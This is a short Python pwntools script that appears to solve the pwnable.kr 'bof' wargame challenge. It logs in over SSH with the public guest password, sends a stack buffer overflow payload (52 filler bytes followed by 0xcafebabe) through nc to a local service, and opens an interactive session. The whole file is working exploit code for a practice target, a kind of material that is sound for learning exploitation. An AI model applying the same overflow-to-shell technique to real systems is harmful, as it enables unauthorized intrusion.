from pwn import ssh, p32

wrapper1 = b'(printf "'
bof = b'A'*52
bof += p32(0xcafebabe)
wrapper2 = b'"; cat) | nc 0 10003\n'

payload = wrapper1 + bof + wrapper2

print(payload)

remote = ssh('bof', 'pwnable.kr', password='guest', port=2222)
proc = remote.run(['bash', '-c', payload.decode('latin1')])
proc.interactive()

remote.close()
